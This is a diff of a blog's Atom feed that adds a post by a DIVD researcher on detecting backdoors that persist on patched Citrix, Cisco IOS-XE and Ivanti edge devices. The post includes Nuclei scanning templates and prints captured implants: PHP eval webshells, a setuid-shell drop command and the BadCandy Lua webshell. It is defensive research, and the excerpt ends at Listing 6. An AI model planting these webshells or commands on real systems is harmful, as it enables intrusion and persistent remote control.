@@ -1,5 +1,458 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en" /><updated>2025-05-30T22:35:55+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Disclosing.Observer</title><subtitle>Test
-</subtitle><author><name>Max</name><email>mhvanderhorst@tudelft.nl</email></author><entry><title type="html">Ready, Retain, Fire? The Quiet Fallout of U.S. Offensive Cyber Policy</title><link href="http://localhost:4000/2025/05/30/us-cyber-policy-zero-day-retention.html" rel="alternate" type="text/html" title="Ready, Retain, Fire? The Quiet Fallout of U.S. Offensive Cyber Policy" /><published>2025-05-30T00:00:00+02:00</published><updated>2025-05-30T00:00:00+02:00</updated><id>http://localhost:4000/2025/05/30/us-cyber-policy-zero-day-retention</id><content type="html" xml:base="http://localhost:4000/2025/05/30/us-cyber-policy-zero-day-retention.html"><![CDATA[<p>Being a CNA administrator means having access to something most people never see: zero-day vulnerabilities. That access comes with responsibility, but also perspective. It’s made me think about how other actors, especially governments, handle this kind of knowledge, and what it means when one side holds a stockpile of vulnerabilities capable of large-scale surveillance or disruption. The U.S. military even <a href="https://cyber.army.mil/News/Article/1325442/stockpiling-zero-day-exploits-the-next-international-weapons-taboo/">considered</a> classifying zero-days as weapons subject to export controls.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en" /><updated>2025-06-15T23:01:38+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Disclosing.Observer</title><subtitle>Test
+</subtitle><author><name>Max</name><email>mhvanderhorst@tudelft.nl</email></author><entry><title type="html">Scanning Beyond the Patch: A Public-Interest Hunt for Hidden Shells</title><link href="http://localhost:4000/2025/06/14/patching-is-not-enough-persistent-backdoors-after-the-fix.html" rel="alternate" type="text/html" title="Scanning Beyond the Patch: A Public-Interest Hunt for Hidden Shells" /><published>2025-06-14T00:00:00+02:00</published><updated>2025-06-14T00:00:00+02:00</updated><id>http://localhost:4000/2025/06/14/patching-is-not-enough-persistent-backdoors-after-the-fix</id><content type="html" xml:base="http://localhost:4000/2025/06/14/patching-is-not-enough-persistent-backdoors-after-the-fix.html"><![CDATA[<blockquote>
+  <p><strong>Summary:</strong><br />
+This blog explores three real-world cases—Citrix ADC (CVE-2023-3519), Cisco IOS XE (CVE-2023-20273), and Ivanti Connect Secure (CVE-2024-21893)—where patching alone failed to remove persistent backdoors from edge devices.<br />
+We detail how these implants worked, how they evaded detection, and how we developed ethical scanning methods at DIVD to detect their remnants through behavioral side channels.<br />
+Each case shows that compromise can survive remediation, and why defenders must look beyond patch status to detect real risk.</p>
+</blockquote>
+
+<p>On the internet’s edge, patching is no longer enough. With attack waves seemingly becoming more opportunistic, it is also important to look for signs that an edge device has already been compromised.</p>
+
+<p>Over the past few years, I’ve notified thousands of organizations about critical vulnerabilities in their VPNs, firewalls, load balancers, and routers. Very often, the actual patching takes a while, or our notification takes some time to arrive. Some organizations may patch by themselves, wondering why the notification they received is relevant at all. They may not realize the uncomfortable truth: patching doesn’t undo compromise.</p>
+
+<p>Attackers that target edge devices often exploit a narrow window of exposure, with <a href="https://vulncheck.com/blog/exploitation-trends-q1-2025">28.3% of vulnerabilities being exploited within a single day</a> of their CVE disclosure in 2025! Some of these exploit waves leave implants that persist even after the initial vulnerability is closed, which is why it’s so important to verify that the underlying system hasn’t been compromised.</p>
+
+<p>The following post is about what we miss when we treat patching as the finish line and why public-interest researchers must go further: scanning not just for vulnerabilities, but for the residue of compromise.</p>
+
+<h1 id="backdoors-after-the-fix">Backdoors after the fix</h1>
+<p>Our dependency on edge devices has <a href="https://www.bls.gov/opub/btn/volume-13/remote-work-productivity.htm">drastically increased</a> since the COVID-19 pandemic, as they support the possibility to work remotely. They’re externally reachable, typically trusted by internal networks, and not always monitored with the same rigor as desktop endpoints or cloud workloads. This, among other reasons, makes edge devices a high-value target. When an attacker gets in through a zero-day or n-day vulnerability, their goal isn’t just access. It’s persistence.</p>
+
+<p>At DIVD, we’ve seen this firsthand. In multiple investigations, such as <a href="https://blog.fox-it.com/2023/08/15/approximately-2000-citrix-netscalers-backdoored-in-mass-exploitation-campaign/amp/">DIVD-2023-00033</a>, by the time a vendor issues a patch and the admin applies it, the exploit path may be closed, but a backdoor is already installed. These aren’t theoretical risks. From simple PHP <code class="language-plaintext highlighter-rouge">eval()</code> implants to backdoors and credential stealers embedded in existing code, masked, and even re-signed by the malware itself, adversaries are developing significant capability in this area and are <a href="https://www.compliancepoint.com/cyber-security/hackers-exploiting-edge-devices-how-to-defend-your-organization/">increasingly treating</a> edge devices as a beachhead.</p>
+
+<p>Some of these implants prevent or survive firmware updates, evade scans for Indicators of Compromise (IoCs), and blend into system components. Yet, after patching, many operators seem to stop looking. The logs are cleared, the traffic looks clean, the box is assumed safe. However, unless we actively look for signs of compromise, patching may only treat the symptom, not the infection.</p>
+
+<h1 id="finding-what-the-patch-missed">Finding what the patch missed</h1>
+<p>Despite vendors releasing patches and integrity checks, we’ve repeatedly encountered edge systems that remain compromised. This makes backdoors an interesting case for our public-interest scanning at DIVD. What follows are anonymized cases that illustrate the gap between vulnerability remediation and true system recovery, and why operators need to look further than just the vulnerability. An important discussion in this context is how to approach the backdoor ethically as I previously discussed in my post on <a href="https://disclosing.observer/2025/05/10/unsolicited-vulnerability-disclosure-ethics.html">scanning ethics</a>.</p>
+
+<p>Not triggering any unintended behavior is essential, so the scanning methodology discussed below for each CVE does not focus on directly using the backdoor to confirm its presence. While this is possible in many cases through the use of magic bytes, keys, or HTTP parameters, focusing on side channels ensures the proportionality of the scan.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Appliance</th>
+      <th style="text-align: left">Vulnerability</th>
+      <th style="text-align: center">Response signature</th>
+      <th style="text-align: right">Scanning method</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Citrix ADC NetScaler</td>
+      <td style="text-align: left">CVE-2023-3519</td>
+      <td style="text-align: center">HTTP 201 on v1, empty HTTP 404 on v2.</td>
+      <td style="text-align: right">Scan for HTTP 201 or empty 404 (without Content-Length) on known PHP paths.</td>
+    </tr>
+    <tr>
+      <td>Cisco IOS-XE</td>
+      <td style="text-align: left">CVE-2023-20198</td>
+      <td style="text-align: center">Fake 404 Not Found page on v1, shell version or 18-character string on v2.</td>
+      <td style="text-align: right">Scan by adding <code class="language-plaintext highlighter-rouge">%25</code> for the first version and checking for 404 Not Found, scanning by using the <code class="language-plaintext highlighter-rouge">logon_hash=1</code> parameter for the second version.</td>
+    </tr>
+    <tr>
+      <td>Ivanti Connect Secure</td>
+      <td style="text-align: left">CVE-2024-21893</td>
+      <td style="text-align: center">HTTP 200 response on endpoint with random characters or the output of <code class="language-plaintext highlighter-rouge">uname -a</code>, expected behavior is a 404.</td>
+      <td style="text-align: right">Scanning on created files by the exploit on index.txt, index1.txt, or index2.txt.</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="citrix-adc-and-netscaler-gateway---cve-2023-3519">Citrix ADC and NetScaler Gateway - CVE-2023-3519</h2>
+<p>In July 2023, Citrix <a href="https://support.citrix.com/external/article?articleUrl=CTX561482-citrix-adc-and-citrix-gateway-security-bulletin-for-cve20233519-cve20233466-cve20233467&amp;language=en_US">disclosed</a> CVE-2023-3519, a critical unauthenticated Remote Code Execution vulnerability in Citrix ADC and NetScaler Gateway when configured as a gateway or AAA virtual server. The vulnerability was actively exploited in the wild at the time of disclosure.</p>
+
+<p>To support remediation at scale, DIVD, in collaboration with Fox-IT, initiated an internet-wide scan campaign under investigation <a href="https://csirt.divd.nl/cases/DIVD-2023-00030/">DIVD-2023-00030</a> for the vulnerability and <a href="https://csirt.divd.nl/cases/DIVD-2023-00033/">DIVD-2023-00033</a> for the backdoor campaign. This was one of the first cases where I experienced how quickly attackers can establish persistence before patches are even applied.</p>
+
+<h3 id="scanning-for-the-backdoors">Scanning for the Backdoors</h3>
+<p>The first backdoor is publicly attributed to criminals. While there was nation state activity around this vulnerability, <a href="https://cloud.google.com/blog/topics/threat-intelligence/citrix-zero-day-espionage/">with a suspected Chinese threat actor spreading implants (dubbed SECRETSAUCE)</a>, our investigation focused on the criminal shell. On July 20th, 2023, implants started appearing. While the nation state shells appeared under the <code class="language-plaintext highlighter-rouge">/var/vpn/themes</code> directory, were asymmetric, and did not contain any clear mistakes, the criminal webshell did and started appearing in the <code class="language-plaintext highlighter-rouge">/logon/LogonPoint/uiareas</code> directory.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">http_response_code</span><span class="p">(</span><span class="mi">201</span><span class="p">);</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="mi">5</span><span class="p">]);</span>
+</code></pre></div></div>
+<p><span class="centered-text">Listing 1: Citrix Webshell version 1</span></p>
+
+<p>This first version of the webshell (illustrated in Listing 1) was a simple PHP <code class="language-plaintext highlighter-rouge">eval</code> backdoor that returns an HTTP 201 (created) response code and passed the value of POST parameter <code class="language-plaintext highlighter-rouge">5</code> to PHP <code class="language-plaintext highlighter-rouge">eval()</code>. The mistake here is that this backdoor introduces a sidechannel: if the endpoint does not exist, it returns HTTP 404 as the response code. Due to the order of the statements, it will return HTTP 201 regardless of the <code class="language-plaintext highlighter-rouge">eval()</code> call succeeding. This allowed us to scan for HTTP 201 as the response code.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">id</span><span class="pi">:</span> <span class="s">citrix-implant-cve-2023-3519</span>
+
+<span class="na">info</span><span class="pi">:</span>
+  <span class="na">name</span><span class="pi">:</span> <span class="s">Citrix CVE-2023-3519 Implant Scan</span>
+  <span class="na">author</span><span class="pi">:</span> <span class="s">DIVD-NL</span>
+  <span class="na">severity</span><span class="pi">:</span> <span class="s">critical</span>
+
+<span class="na">http</span><span class="pi">:</span>
+  <span class="pi">-</span> <span class="na">method</span><span class="pi">:</span> <span class="s">POST</span>
+    <span class="na">path</span><span class="pi">:</span>
+      <span class="pi">-</span> <span class="s2">"</span><span class="s">{{BaseURL}}/logon/LogonPoint/uiareas/{{uri}}"</span>
+    
+    <span class="na">payloads</span><span class="pi">:</span>
+      <span class="na">uri</span><span class="pi">:</span>
+        <span class="pi">-</span> <span class="s2">"</span><span class="s">{{filename:common_php_filenames.txt}}"</span>
+
+    <span class="na">matchers</span><span class="pi">:</span>
+      <span class="pi">-</span> <span class="na">type</span><span class="pi">:</span> <span class="s">status</span>
+        <span class="na">status</span><span class="pi">:</span>
+          <span class="pi">-</span> <span class="m">201</span>
+</code></pre></div></div>
+<p><span class="centered-text">Listing 2: Nuclei scanning template for the Citrix Webshells</span></p>
+
+<p>This backdoor was included under filenames that match the most <a href="https://gitlab.com/kalilinux/packages/seclists/blob/b83a756bb2c06f94c03e525326e8480981b58a9c/Discovery/Web-Content/Common-PHP-Filenames.txt">common PHP filenames</a>, among which <code class="language-plaintext highlighter-rouge">prod.php</code>, <code class="language-plaintext highlighter-rouge">log.php</code>, <code class="language-plaintext highlighter-rouge">logout.php</code>. This allowed us to iterate over the list of filenames and query the target system for the presence of the backdoor. The downside of this is that, given each system would have to accept a few thousand requests from us, we had to diffuse scan targets and scan over a prolonged time as to not overwhelm systems with our scanning. The scan template is shown in Listing 2.</p>
+
+<p>On July 21st, however, the implant moved. There was a sudden drop in vulnerable devices as the old implants seemed to have been used to deploy a newer, more ‘sophisticated’ implant. As shown in Listing 3, instead of returning an HTTP 201 response, the implant now returns an empty HTTP 404 and introduced a key to the <code class="language-plaintext highlighter-rouge">eval()</code> call. This functions as a basic authentication mechanism.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cp</span> /bin/sh /var/nss <span class="o">&amp;&amp;</span> <span class="nb">chmod</span> +s /var/nss <span class="o">&amp;&amp;</span> <span class="nb">mkdir</span> /netscaler/ns_gui/epa/scripts/[redacted]<span class="p">;</span> 
+<span class="nb">echo</span> <span class="s1">'&lt;?php  http_response_code(404); @eval($_POST[redacted]);'</span> <span class="o">&gt;</span> 
+/netscaler/ns_gui/epa/scripts/[redacted]/[redacted].php
+</code></pre></div></div>
+<p><span class="centered-text">Listing 3: Evolution of the Citrix Webshell to further obfuscate</span></p>
+
+<p>The same mistake as with the previous implant was repeated here, though. Returning an empty HTTP 404 response is atypical for Citrix software. It typically returns an HTTP 302 or at least contains some headers (in particular a Content-Length header). So this time, we could scan for that. This led us to refine the scanning template for 404 anomalies (Listing 4).</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">id</span><span class="pi">:</span> <span class="s">citrix-implant-cve-2023-3519-v2</span>
+
+<span class="na">info</span><span class="pi">:</span>
+  <span class="na">name</span><span class="pi">:</span> <span class="s">Citrix CVE-2023-3519 Implant Scan - v2</span>
+  <span class="na">author</span><span class="pi">:</span> <span class="s">DIVD-NL</span>
+  <span class="na">severity</span><span class="pi">:</span> <span class="s">critical</span>
+
+<span class="na">http</span><span class="pi">:</span>
+  <span class="pi">-</span> <span class="na">method</span><span class="pi">:</span> <span class="s">POST</span>
+    <span class="na">path</span><span class="pi">:</span>
+      <span class="pi">-</span> <span class="s2">"</span><span class="s">{{BaseURL}}/{{uri}}"</span>
+    
+    <span class="na">payloads</span><span class="pi">:</span>
+      <span class="na">uri</span><span class="pi">:</span>
+        <span class="pi">-</span> <span class="s2">"</span><span class="s">{{filename:common_php_filenames.txt}}"</span>
+    
+    <span class="na">matchers-condition</span><span class="pi">:</span> <span class="s">and</span>
+    <span class="na">matchers</span><span class="pi">:</span>
+      <span class="pi">-</span> <span class="na">type</span><span class="pi">:</span> <span class="s">status</span>
+        <span class="na">status</span><span class="pi">:</span>
+          <span class="pi">-</span> <span class="m">404</span>
+
+      <span class="pi">-</span> <span class="na">type</span><span class="pi">:</span> <span class="s">regex</span>
+        <span class="na">part</span><span class="pi">:</span> <span class="s">header</span>
+        <span class="na">negative</span><span class="pi">:</span> <span class="kc">true</span>
+        <span class="na">regex</span><span class="pi">:</span>
+          <span class="pi">-</span> <span class="s1">'</span><span class="s">Content-Length:'</span>
+</code></pre></div></div>
+<p><span class="centered-text">Listing 4: Nuclei scanning template for the updated Citrix Webshells</span></p>
+
+<h3 id="results-increasing-global-overview-with-759">Results: increasing global overview with 759%</h3>
+<p>Together with Fox-IT, we scanned 264.000 IP addresses. Of these IPs, 31.127 Citrix hosts were vulnerable at that time. Of these 31.127 vulnerable hosts, we found 2491 implants worldwide, nearly eight times more than were previously known. As Figure 1 shows, Europe and Asia were popular in particular. Through collaboration with various channels such as The Shadowserver Foundation, government CSIRTs, and directly notifying, we could decrease the number of backdoors steadily over the months after.</p>
+
+<figure class="centered-img">
+  <img style="margin:auto; display:block; padding:10px; max-width:79%;" src="../../../assets/backdoored-top-20-citrix.png" alt="VEP Process" />
+  <figcaption style="text-align:center;">Figure 1: Fox-IT numbers of backdoored instances, source: NCC Group</figcaption>
+</figure>
+
+<h2 id="cisco-ios-xe---cve-2023-20273">Cisco IOS-XE - CVE-2023-20273</h2>
+<p>In late September 2023, Cisco disclosed CVE-2023-20198, a critical unauthenticated Remote Code Execution vulnerability affecting the Web UI of Cisco IOS-XE devices. The bug allowed attackers to create privileged user accounts without authentication, often as a precursor to installing a persistent implant via the vulnerability. Once deployed, the implant allowed arbitrary command execution over HTTPS and could persist across reboots in some of the cases.</p>
+
+<p>This vulnerability saw an explosive amount of exploit activity as well, with a threat actor installing the BadCandy malware on a global scale. DIVD scanned for these implants under investigation <a href="https://csirt.divd.nl/cases/DIVD-2023-00038/">DIVD-2023-00038</a>.</p>
+
+<h3 id="scanning-for-the-backdoors-1">Scanning for the Backdoors</h3>
+<p>The implant installed using this vulnerability, called BadCandy, is a bit more complex than the previous implants. BadCandy is a Lua-based webshell and consists of 29 lines of code that facilitate arbitrary command execution and is disguised as an Nginx configuration. The attacker can use the webshell by creating HTTP POST requests the <code class="language-plaintext highlighter-rouge">/webui/logoutconfirm.html</code> endpoint.</p>
+
+<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">location</span> <span class="o">/</span><span class="n">webui</span><span class="o">/</span><span class="n">logoutconfirm</span><span class="p">.</span><span class="n">html</span> <span class="p">{</span>
+    <span class="n">add_header</span> <span class="n">Content</span><span class="o">-</span><span class="n">Type</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">;</span>	
+    <span class="n">add_header</span> <span class="n">Cache</span><span class="o">-</span><span class="n">Control</span> <span class="s1">'no-cache, no-store, must-revalidate'</span><span class="p">;</span>
+    <span class="n">add_header</span> <span class="n">Pragma</span> <span class="n">no</span><span class="o">-</span><span class="n">cache</span><span class="p">;</span>
+    <span class="n">add_header</span> <span class="n">Strict</span><span class="o">-</span><span class="n">Transport</span><span class="o">-</span><span class="n">Security</span> <span class="s2">"max-age=31536000; includeSubdomain"</span><span class="p">;</span>
+    <span class="n">content_by_lua_block</span> <span class="p">{</span>
+            
+            <span class="kd">local</span> <span class="n">method</span> <span class="o">=</span> <span class="n">ngx</span><span class="p">.</span><span class="n">req</span><span class="p">.</span><span class="n">get_method</span><span class="p">()</span>
+            <span class="kd">local</span> <span class="n">headers</span> <span class="o">=</span> <span class="n">ngx</span><span class="p">.</span><span class="n">req</span><span class="p">.</span><span class="n">get_headers</span><span class="p">()</span>
+            <span class="kd">local</span> <span class="n">params</span> <span class="o">=</span> <span class="n">ngx</span><span class="p">.</span><span class="n">req</span><span class="p">.</span><span class="n">get_uri_args</span><span class="p">()</span>
+            <span class="kd">local</span> <span class="n">authorized</span> <span class="o">=</span> <span class="kc">true</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">method</span> <span class="o">==</span> <span class="s2">"POST"</span> <span class="ow">and</span> <span class="n">params</span> <span class="o">~=</span> <span class="kc">nil</span><span class="p">)</span> <span class="k">then</span>
+                <span class="k">if</span> <span class="p">(</span><span class="n">headers</span><span class="p">[</span><span class="s2">"Authorization"</span><span class="p">]</span> <span class="o">~=</span> <span class="kc">nil</span> <span class="p">)</span> <span class="k">then</span>
+                    <span class="kd">local</span> <span class="n">authcode</span> <span class="o">=</span> <span class="nb">string.gsub</span><span class="p">(</span><span class="n">headers</span><span class="p">[</span><span class="s2">"Authorization"</span><span class="p">],</span> <span class="s2">"^%s*(.-)%s*$"</span><span class="p">,</span> <span class="s2">"%1"</span><span class="p">)</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="n">authcode</span> <span class="o">~=</span> <span class="kc">nil</span> <span class="ow">and</span> <span class="nb">string.match</span><span class="p">(</span><span class="n">authcode</span><span class="p">,</span> <span class="s2">"^%w+$"</span><span class="p">)</span> <span class="o">~=</span> <span class="kc">nil</span><span class="p">)</span> <span class="k">then</span>
+                        <span class="kd">local</span> <span class="n">f</span> <span class="o">=</span> <span class="nb">io.popen</span><span class="p">(</span><span class="s2">""</span><span class="p">,</span><span class="s2">"r"</span><span class="p">)</span>
+                        <span class="k">if</span> <span class="p">(</span><span class="n">f</span> <span class="o">~=</span> <span class="kc">nil</span><span class="p">)</span> <span class="k">then</span>
+                            <span class="kd">local</span> <span class="n">shasum</span> <span class="o">=</span> <span class="n">f</span><span class="p">:</span><span class="n">read</span><span class="p">(</span><span class="s2">"*all"</span><span class="p">)</span>
+                            <span class="n">shasum</span> <span class="o">=</span> <span class="nb">string.lower</span><span class="p">(</span><span class="n">shasum</span><span class="p">)</span>
+                            <span class="k">if</span> <span class="nb">string.find</span><span class="p">(</span><span class="n">shasum</span><span class="p">,</span> <span class="s2">"&lt;redacted&gt;"</span><span class="p">)</span> <span class="k">then</span>
+                                <span class="n">authorized</span> <span class="o">=</span> <span class="kc">true</span>
+                            <span class="k">end</span>
+                            <span class="n">f</span><span class="p">:</span><span class="n">close</span><span class="p">()</span>
+                        <span class="k">end</span>
+                    <span class="k">end</span>
+                <span class="k">end</span>
+                <span class="k">if</span> <span class="p">(</span><span class="n">authorized</span> <span class="o">==</span> <span class="kc">true</span><span class="p">)</span> <span class="k">then</span>
+                    <span class="n">ngx</span><span class="p">.</span><span class="n">req</span><span class="p">.</span><span class="n">read_body</span><span class="p">()</span>
+                    <span class="kd">local</span> <span class="n">body</span> <span class="o">=</span> <span class="n">ngx</span><span class="p">.</span><span class="n">req</span><span class="p">.</span><span class="n">get_body_data</span><span class="p">()</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="n">params</span><span class="p">[</span><span class="s2">"menu"</span><span class="p">]</span> <span class="o">~=</span> <span class="kc">nil</span> <span class="ow">and</span> <span class="n">params</span><span class="p">[</span><span class="s2">"menu"</span><span class="p">]</span> <span class="o">~=</span> <span class="s2">""</span><span class="p">)</span> <span class="k">then</span>
+                        <span class="n">content</span> <span class="o">=</span> <span class="s2">"/2010202301/"</span>
+                    <span class="k">elseif</span> <span class="p">(</span><span class="n">params</span><span class="p">[</span><span class="s2">"logon_hash"</span><span class="p">]</span> <span class="o">~=</span> <span class="kc">nil</span> <span class="ow">and</span> <span class="n">params</span><span class="p">[</span><span class="s2">"logon_hash"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"1"</span><span class="p">)</span> <span class="k">then</span>
+                        <span class="n">content</span> <span class="o">=</span> <span class="s2">"&lt;redacted&gt;"</span>
+                    <span class="k">elseif</span> <span class="p">(</span><span class="n">params</span><span class="p">[</span><span class="s2">"logon_hash"</span><span class="p">]</span> <span class="o">~=</span> <span class="n">niL</span> <span class="ow">and</span> <span class="n">params</span><span class="p">[</span><span class="s2">"logon_hash"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"&lt;redacted&gt;&gt;"</span> <span class="ow">and</span> <span class="n">params</span><span class="p">[</span><span class="s2">"common_type"</span><span class="p">]</span> <span class="o">~=</span> <span class="kc">nil</span><span class="p">)</span> <span class="k">then</span>
+                        <span class="k">if</span> <span class="p">(</span><span class="n">params</span><span class="p">[</span><span class="s2">"common_type"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"subsystem"</span><span class="p">)</span> <span class="k">then</span>
+                            <span class="kd">local</span> <span class="n">f</span> <span class="o">=</span> <span class="nb">io.popen</span><span class="p">(</span><span class="n">body</span><span class="p">,</span> <span class="s2">"r"</span><span class="p">)</span>
+                            <span class="k">if</span> <span class="p">(</span><span class="n">f</span> <span class="o">~=</span> <span class="kc">nil</span><span class="p">)</span> <span class="k">then</span>
+                                <span class="n">content</span> <span class="o">=</span> <span class="n">f</span><span class="p">:</span><span class="n">read</span><span class="p">(</span><span class="s2">"*all"</span><span class="p">)</span>
+                                <span class="n">f</span><span class="p">:</span><span class="n">close</span><span class="p">()</span>
+                            <span class="k">end</span>
+                        <span class="k">elseif</span> <span class="p">(</span><span class="n">params</span><span class="p">[</span><span class="s2">"common_type"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"iox"</span><span class="p">)</span> <span class="k">then</span>
+                            <span class="n">ngx</span><span class="p">.</span><span class="n">req</span><span class="p">.</span><span class="n">set_header</span><span class="p">(</span><span class="s2">"Priv-Level"</span><span class="p">,</span> <span class="s2">"15"</span><span class="p">)</span>
+                            <span class="kd">local</span> <span class="n">result</span> <span class="o">=</span> <span class="n">ngx</span><span class="p">.</span><span class="n">location</span><span class="p">.</span><span class="n">capture</span><span class="p">(</span><span class="s2">"*/luas"</span><span class="p">,</span> <span class="p">{</span><span class="n">method</span><span class="o">=</span><span class="n">ngx</span><span class="p">.</span><span class="n">HTTP_POST</span><span class="p">,</span> <span class="n">body</span><span class="o">=</span><span class="n">body</span><span class="p">})</span> 
+                            <span class="kd">local</span> <span class="n">response</span> <span class="o">=</span> <span class="n">result</span><span class="p">.</span><span class="n">body</span>
+                            <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="n">response</span> <span class="o">==</span> <span class="kc">nil</span> <span class="ow">or</span> <span class="n">response</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="k">then</span>
+                                <span class="n">content</span> <span class="o">=</span> <span class="n">response</span>
+                            <span class="k">end</span>
+                        <span class="k">end</span>
+                    <span class="k">end</span>
+                <span class="k">end</span>
+            <span class="k">end</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">authorized</span> <span class="o">==</span> <span class="kc">true</span><span class="p">)</span> <span class="k">then</span>
+                <span class="n">ngx</span><span class="p">.</span><span class="n">status</span> <span class="o">=</span> <span class="mi">200</span>
+                <span class="n">ngx</span><span class="p">.</span><span class="n">say</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+            <span class="k">else</span>
+                <span class="kd">local</span> <span class="n">result</span> <span class="o">=</span> <span class="n">ngx</span><span class="p">.</span><span class="n">location</span><span class="p">.</span><span class="n">capture</span><span class="p">(</span><span class="s2">"/internalWebui/login.html"</span><span class="p">,</span> <span class="p">{</span><span class="n">method</span> <span class="o">=</span> <span class="n">ngx</span><span class="p">.</span><span class="n">HTTP_GET</span><span class="p">})</span>
+                <span class="k">if</span> <span class="n">result</span> <span class="k">then</span>
+                    <span class="n">ngx</span><span class="p">.</span><span class="n">status</span> <span class="o">=</span> <span class="n">result</span><span class="p">.</span><span class="n">status</span>
+                    <span class="k">if</span> <span class="n">result</span><span class="p">.</span><span class="n">body</span> <span class="k">then</span>
+                        <span class="n">ngx</span><span class="p">.</span><span class="n">say</span><span class="p">(</span><span class="n">result</span><span class="p">.</span><span class="n">body</span><span class="p">)</span>
+                    <span class="k">end</span>
+                <span class="k">end</span>
+            <span class="k">end</span>
+    <span class="p">}</span> 
+<span class="p">}</span>
+</code></pre></div></div>
+<p><span class="centered-text">Listing 5: BadCandy implant for Cisco IOS-XE - version 1</span></p>
+
+<p>Listing 5 shows the full logic of the initial BadCandy implant, disguised as an Nginx config block. In most early instances of the backdoor, if the <code class="language-plaintext highlighter-rouge">?logon_hash=1</code> parameter is set, it will return an 18-character hexadecimal string. If the <code class="language-plaintext highlighter-rouge">common_type</code> parameter is <code class="language-plaintext highlighter-rouge">subsystem</code>, it executes the request body, and if the <code class="language-plaintext highlighter-rouge">common_type</code> parameter is <code class="language-plaintext highlighter-rouge">iox</code>, it will execute on Privilege Level 15. The <code class="language-plaintext highlighter-rouge">login_hash</code> parameter also allowed including a 40-character hash that serves as an authentication mechanism for the command execution functionality.</p>
+
+<p>Around October 20, 2023, a second version of the implant appeared that included an additional authentication mechanism, shown in Listing 6. The second version included a preliminary check for an HTTP Authorization header. Cisco Talos <a href="https://blog.talosintelligence.com/active-exploitation-of-cisco-ios-xe-software/">suspected at the time</a> that this was a reactive measure to prevent the identification of compromised systems. Later, a third version of the BadCandy implant would include an additional check for a <code class="language-plaintext highlighter-rouge">X-Csrf-Token</code> HTTP header in a similar fashion. Strangely enough, the third version would qualify an incoming request as authorized as long as one of the two headers would be correct.</p>
+
+<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">if</span> <span class="p">(</span><span class="n">method</span> <span class="o">==</span> <span class="s2">"POST"</span> <span class="ow">and</span> <span class="n">params</span> <span class="o">~=</span> <span class="kc">nil</span><span class="p">)</span> <span class="k">then</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">headers</span><span class="p">[</span><span class="s2">"Authorization"</span><span class="p">]</span> <span class="o">~=</span> <span class="kc">nil</span> <span class="p">)</span> <span class="k">then</span>
+          <span class="kd">local</span> <span class="n">authcode</span> <span class="o">=</span> <span class="nb">string.gsub</span><span class="p">(</span><span class="n">headers</span><span class="p">[</span><span class="s2">"Authorization"</span><span class="p">],</span> <span class="s2">"^%s*(.-)%s*$"</span><span class="p">,</span> <span class="s2">"%1"</span><span class="p">)</span>
+          <span class="k">if</span> <span class="p">(</span><span class="n">authcode</span> <span class="o">~=</span> <span class="kc">nil</span> <span class="ow">and</span> <span class="nb">string.match</span><span class="p">(</span><span class="n">authcode</span><span class="p">,</span> <span class="s2">"^%w+$"</span><span class="p">)</span> <span class="o">~=</span> <span class="kc">nil</span><span class="p">)</span> <span class="k">then</span>
+              <span class="kd">local</span> <span class="n">f</span> <span class="o">=</span> <span class="nb">io.popen</span><span class="p">(</span><span class="s2">""</span><span class="p">,</span><span class="s2">"r"</span><span class="p">)</span>
+              <span class="k">if</span> <span class="p">(</span><span class="n">f</span> <span class="o">~=</span> <span class="kc">nil</span><span class="p">)</span> <span class="k">then</span>
+                  <span class="kd">local</span> <span class="n">shasum</span> <span class="o">=</span> <span class="n">f</span><span class="p">:</span><span class="n">read</span><span class="p">(</span><span class="s2">"*all"</span><span class="p">)</span>
+                  <span class="n">shasum</span> <span class="o">=</span> <span class="nb">string.lower</span><span class="p">(</span><span class="n">shasum</span><span class="p">)</span>
+                  <span class="k">if</span> <span class="nb">string.find</span><span class="p">(</span><span class="n">shasum</span><span class="p">,</span> <span class="s2">"&lt;redacted&gt;"</span><span class="p">)</span> <span class="k">then</span>
+                      <span class="n">authorized</span> <span class="o">=</span> <span class="kc">true</span>
+                  <span class="k">end</span>
+                  <span class="n">f</span><span class="p">:</span><span class="n">close</span><span class="p">()</span>
+              <span class="k">end</span>
+          <span class="k">end</span>
+      <span class="k">end</span>
+</code></pre></div></div>
+<p><span class="centered-text">Listing 6: Introduced Authorization header mechanism to BadCandy</span></p>
+
